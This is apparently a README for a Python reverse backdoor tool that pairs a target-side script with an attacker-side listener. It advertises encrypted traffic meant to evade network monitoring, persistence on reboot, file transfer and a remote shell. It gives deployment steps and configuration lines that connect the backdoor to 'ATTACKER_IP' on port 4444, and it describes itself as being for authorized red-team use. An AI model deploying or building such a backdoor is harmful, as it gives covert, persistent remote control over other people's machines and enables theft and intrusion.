üîê Python Backdoor Tool (SSL/TLS Encrypted)
A stealthy, cross-platform backdoor with encrypted communication (SSL/TLS), persistence mechanisms, and remote command execution. Designed for penetration testers and red teamers to simulate post-exploitation activities in authorized environments.

‚ú® Key Features
‚úÖ Encrypted Communication ‚Äì SSL/TLS secured to evade basic network monitoring.
‚úÖ Persistence ‚Äì Auto-starts on reboot (Windows, Linux, macOS).
‚úÖ File Transfer ‚Äì Upload/download files to/from the target.
‚úÖ Remote Shell ‚Äì Execute system commands remotely.
‚úÖ Lightweight ‚Äì No bloated dependencies, just Python 3.

üõ†Ô∏è Setup & Usage
1Ô∏è‚É£ Prerequisites
Python 3.6+
pycryptodome (for optional AES encryption)
Install dependencies:

pip install -r requirements.txt
2Ô∏è‚É£ Configuration
Backdoor (reverse_backdoor.py)
Edit these values before deploying:

my_backdoor = Backdoor("ATTACKER_IP", 4444, "STRONG_PASSWORD")  # Replace!
Listener (listener.py)
Ensure the IP/password match:

my_backdoor = Backdoor("YOUR_IP", 4444, "STRONG_PASSWORD")  # Same as above!

3Ô∏è‚É£ Running the Tool

Start the listener (attacker machine):
python listener.py

Deploy the backdoor (target machine):\
python reverse_backdoor.py


üîß Customization
Change Port/Password
Modify these in both files:

Backdoor("IP", PORT, "PASSWORD")  # Update IP/port/password
Disable SSL (Not Recommended)
Replace _secure_connect with a plain socket:

def _secure_connect(self, ip, port):
    return socket.create_connection((ip, port))
